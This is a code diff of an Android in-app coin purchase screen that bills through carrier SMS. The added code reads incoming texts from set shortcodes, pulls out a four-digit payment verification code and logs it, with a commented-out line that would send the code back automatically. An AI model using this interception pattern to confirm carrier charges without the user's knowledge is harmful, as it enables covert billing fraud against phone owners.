@@ -7,6 +7,7 @@ import android.os.Bundle;
 import android.support.annotation.Nullable;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
+import android.text.TextUtils;
 import android.view.View;
 import android.widget.TextView;
 
@@ -46,7 +47,7 @@ public class PayForCoinActivity extends BaseActivity {
     private Unbinder mUnbinder;
     private int mActionType;
     private List<String> mData = new ArrayList<>();
-    private  SmsReceiver mSmsReceiver;
+    private SmsReceiver mSmsReceiver;
 
     public static void startActivity(Context context, int actionType) {
         Intent intent = new Intent(context, PayForCoinActivity.class);
@@ -68,9 +69,14 @@ public class PayForCoinActivity extends BaseActivity {
         mSmsReceiver.registerSmsReceiver(PayForCoinActivity.this, new SmsReceiver.SmsListener() {
             @Override
             public void onMessage(String msg, String fromAddress, String serviceCenterAddress) {
-                LogUtils.e("msg=" + msg);
-                LogUtils.e("fromAdd=" + fromAddress);
-                LogUtils.e("serviceCenterAdd" + serviceCenterAddress);
+                if (fromAddress.equals("1000188") && msg.contains("成功定制")) {
+
+                } else if (fromAddress.equals("1065987320001") && msg.contains("支付验证码")) {
+                    LogUtils.e(msg.substring(0, 4));
+//                    sendMsg("", msg.substring(0, 4));
+                } else if (fromAddress.equals("11803087") && msg.contains("完成购买")) {
+
+                }
             }
         });
 
@@ -96,7 +102,7 @@ public class PayForCoinActivity extends BaseActivity {
             @Override
             public void onItemChildClick(BaseQuickAdapter adapter, View view, int position) {
                 String imsi = TelephoneUtil.getIMSI(PayForCoinActivity.this);
-                if ((!imsi.startsWith("46003")) && (!imsi.startsWith("46011")) && (!imsi.startsWith("46005"))) {
+                if (!TextUtils.isEmpty(imsi) && !imsi.startsWith("46003") && (!imsi.startsWith("46011")) && (!imsi.startsWith("46005"))) {
                     final PayDetailDialog dialog = new PayDetailDialog(PayForCoinActivity.this);
                     dialog.setListener(new PayDetailDialog.PayDetailDialogListener() {
                         @Override
@@ -124,19 +130,20 @@ public class PayForCoinActivity extends BaseActivity {
                     });
                     dialog.show();
                 } else {
-                    //todo send message
-
-                    RxPermissions rxPermissions = new RxPermissions(PayForCoinActivity.this);
-                    rxPermissions.request(Manifest.permission.SEND_SMS)
-                            .subscribe(grant -> {
-                                if (grant){
-                                    mSmsReceiver.sendMsgToPhone("10001", "108");
-                                    LogUtils.e("sendmessage");
-                                }
-                            });
+                    sendMsg("10001", "108");
                 }
             }
         });
+    }
+
+    private void sendMsg(String phone, String msg) {
+        RxPermissions rxPermissions = new RxPermissions(PayForCoinActivity.this);
+        rxPermissions.request(Manifest.permission.SEND_SMS)
+                .subscribe(grant -> {
+                    if (grant) {
+                        mSmsReceiver.sendMsgToPhone(phone, msg);
+                    }
+                });
     }
 
     @Override
